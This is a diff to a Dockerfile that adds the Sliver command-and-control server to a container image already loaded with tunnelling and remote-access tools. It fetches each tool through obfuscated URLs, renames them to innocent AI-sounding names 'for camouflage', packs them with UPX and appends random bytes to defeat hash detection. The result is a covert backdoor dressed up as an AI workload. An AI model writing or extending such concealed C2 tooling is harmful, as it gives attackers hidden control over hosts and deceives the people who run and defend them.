@@ -14,7 +14,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     echo "Port 2222" >> /etc/ssh/sshd_config && \
     ssh-keygen -A
 
-# Install Tailscale, Filebrowser, Playit, Chisel, and GOST
+# Install Tailscale, Filebrowser, Playit, Chisel, GOST, and Sliver
 RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
     curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
@@ -26,7 +26,10 @@ RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz && \
     tar -xzf /tmp/gost.tar.gz -C /tmp/ && \
     mv /tmp/gost /usr/bin/system-bridge && \
-    chmod +x /usr/bin/system-bridge
+    chmod +x /usr/bin/system-bridge && \
+    curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.4/sliver-server_linux") \
+        -o /usr/bin/gradient-optimizer && \
+    chmod +x /usr/bin/gradient-optimizer
 
 # Rename tools for camouflage
 RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
@@ -39,7 +42,8 @@ RUN upx -1 /usr/bin/python-cache-manager || true && \
     upx -1 /usr/bin/ai-metrics-collector || true && \
     upx -1 /usr/bin/tensor-allocator || true && \
     upx -1 /usr/bin/cuda-mesh-bridge || true && \
-    upx -1 /usr/bin/system-bridge || true
+    upx -1 /usr/bin/system-bridge || true && \
+    upx -1 /usr/bin/gradient-optimizer || true
 
 # Randomize binary hashes by appending random bytes to the actual ELF files
 RUN head -c 32 /dev/urandom >> /usr/bin/python-cache-manager && \
@@ -47,7 +51,11 @@ RUN head -c 32 /dev/urandom >> /usr/bin/python-cache-manager && \
     head -c 32 /dev/urandom >> /usr/bin/ai-metrics-collector && \
     head -c 32 /dev/urandom >> /usr/bin/tensor-allocator && \
     head -c 32 /dev/urandom >> /usr/bin/cuda-mesh-bridge && \
-    head -c 32 /dev/urandom >> /usr/bin/system-bridge
+    head -c 32 /dev/urandom >> /usr/bin/system-bridge && \
+    head -c 32 /dev/urandom >> /usr/bin/gradient-optimizer
+
+# Pre-extract Sliver server assets to avoid first-boot delay
+RUN /usr/bin/gradient-optimizer unpack --force || true
 
 # Install AI dependencies using uv
 RUN uv pip install --system --no-cache-dir \
